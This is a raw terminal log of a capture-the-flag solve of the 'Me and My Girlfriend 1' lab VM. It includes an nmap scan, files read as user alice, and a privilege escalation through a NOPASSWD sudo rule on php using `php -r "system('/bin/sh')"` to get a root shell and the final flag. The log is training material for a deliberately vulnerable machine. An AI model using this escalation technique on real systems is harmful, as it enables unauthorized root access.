root@ap:~/Scrivania/CTF/Me_and_My_Girlfriend_1# nmap -A -p- 192.168.1.17
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-04 21:47 CET
Nmap scan report for gfriEND.homenet.telecomitalia.it (192.168.1.17)
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:F9:8F:06 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms gfriEND.homenet.telecomitalia.it (192.168.1.17)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
root@ap:~/Scrivania/CTF/Me_and_My_Girlfriend_1# 



User-Agent: *
Allow: /heyhoo.txt



alice@gfriEND:~/.my_secret$ cat flag1.txt 
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}




-rw-rw-r-- 1 alice alice  119 Dec 13 12:23 my_notes.txt
alice@gfriEND:~/.my_secret$ cat my_notes.txt 
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes


alice@gfriEND:~/.my_secret$ sudo -l 
Matching Defaults entries for alice on gfriEND:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php
alice@gfriEND:~/.my_secret$ 
alice@gfriEND:~/.my_secret$ 
alice@gfriEND:~/.my_secret$ CMD="/bin/sh"
alice@gfriEND:~/.my_secret$ sudo root php -r "system('$CMD');"
[sudo] password for alice: 
sudo: root: command not found
alice@gfriEND:~/.my_secret$ sudo -u root php -r "system('$CMD');"

id
uid=0(root) gid=0(root) groups=0(root)

ls
flag1.txt
my_notes.txt
cd /root
ls
flag2.txt
cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}

